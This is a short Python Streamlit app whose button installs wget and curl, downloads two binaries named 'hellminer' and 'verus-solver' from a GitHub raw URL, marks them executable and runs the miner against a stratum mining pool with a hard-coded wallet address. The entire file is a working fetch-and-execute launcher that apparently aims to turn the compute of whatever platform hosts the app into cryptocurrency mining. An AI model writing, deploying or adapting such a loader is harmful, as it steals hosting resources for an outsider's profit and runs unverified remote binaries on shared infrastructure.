import os
import streamlit as st

# Streamlit App Title
st.title("Mining Script Execution")

# Description
st.write("This app allows you to download and execute a mining script.")

# Button to trigger the script
if st.button("Run Mining Script"):
    st.write("Executing script...")

    try:
        # Install wget and curl (without sudo)
        st.write("Installing wget and curl...")
        os.system("apt-get update && apt-get install -y wget curl")
        # Download hellminer and verus-solver
        st.write("Downloading hellminer and verus-solver...")
        os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/hellminer")
        os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/verus-solver")
        # Set executable permissions
        st.write("Setting permissions...")
        os.system("chmod +x hellminer verus-solver")
        # Run the mining script
        st.write("Running mining script...")
        os.system("./hellminer -c stratum+tcp://us.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx..bajingan -p x --cpu 4 -F")

        st.success("Mining script executed successfully!")
    except Exception as e:
        st.error(f"An error occurred: {e}")
